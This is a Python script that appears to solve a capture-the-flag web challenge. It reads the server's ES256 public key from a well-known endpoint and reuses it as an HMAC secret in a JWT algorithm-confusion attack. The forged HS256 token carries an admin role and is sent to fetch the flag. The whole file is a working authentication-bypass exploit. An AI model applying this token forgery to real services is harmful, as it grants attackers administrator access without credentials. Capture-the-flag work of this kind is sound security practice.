#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import re
import time

import requests

BASE_URL = "http://noauth.putcyberdays.pl:80"


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def forge_admin_token(base_url: str) -> str:
    well_known = requests.get(f"{base_url}/.well-known", timeout=10).json()

    # Server bug: verify key path for ES256 points to OpenSSH pubkey line with CRLF.
    # Algorithm confusion lets us pick HS256 and use that exact bytes as HMAC secret.
    es_blob = well_known["es256"]
    hmac_secret = f"ecdsa-sha2-nistp256 {es_blob}\r\n".encode()

    header = {"alg": "HS256"}
    now = int(time.time())
    payload = {
        "iss": "example.com",
        "aud": "example.com",
        "exp": now + 3600,
        "iat": now,
        "role": "admin",
        "sub": "pwn",
    }

    encoded_header = b64u(json.dumps(header).encode())
    encoded_payload = b64u(json.dumps(payload).encode())
    signing_input = f"{encoded_header}.{encoded_payload}".encode()

    signature = hmac.new(hmac_secret, signing_input, hashlib.sha256).digest()
    encoded_signature = b64u(signature)
    return f"{encoded_header}.{encoded_payload}.{encoded_signature}"


def main() -> None:
    token = forge_admin_token(BASE_URL)
    resp = requests.get(
        f"{BASE_URL}/flag",
        cookies={"access_token": token},
        timeout=10,
    )
    m = re.search(r"putcCTF\{[^}]+\}", resp.text)
    if m:
        print(m.group(0))
    else:
        print("Flag not found")
        print(resp.status_code)
        print(resp.text[:500])


if __name__ == "__main__":
    main()
